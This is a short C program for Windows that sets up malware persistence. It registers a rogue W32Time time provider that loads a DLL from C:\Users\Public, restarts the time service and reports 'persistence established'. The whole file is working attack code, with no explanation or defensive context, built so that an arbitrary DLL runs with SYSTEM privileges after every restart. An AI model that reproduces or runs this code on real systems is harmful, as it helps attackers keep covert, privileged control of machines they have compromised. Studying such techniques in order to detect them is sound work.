#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    LPCSTR subkey = "SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\ServDLL";
    LPCSTR dllPath = "C:\\Users\\Public\\servDLL.dll";
    DWORD enabled = 1;
    DWORD inputProvider = 1;
    LONG result;

    result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to create/open registry key: %ld\n", result);
        return 1;
    }

    result = RegSetValueExA(hKey, "DllName", 0, REG_SZ, (const BYTE*)dllPath, strlen(dllPath) + 1);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set DllName value: %ld\n", result);
        RegCloseKey(hKey);
        return 1;
    }

    result = RegSetValueExA(hKey, "Enabled", 0, REG_DWORD, (const BYTE*)&enabled, sizeof(enabled));
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set Enabled value: %ld\n", result);
        RegCloseKey(hKey);
        return 1;
    }

    result = RegSetValueExA(hKey, "InputProvider", 0, REG_DWORD, (const BYTE*)&inputProvider, sizeof(inputProvider));
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set InputProvider value: %ld\n", result);
        RegCloseKey(hKey);
        return 1;
    }

    RegCloseKey(hKey);
    
    system("net stop w32time >nul 2>&1");

    system("net start w32time >nul 2>&1");

    printf("[+] Time Provider persistence established successfully.\n");
    return 0;
}
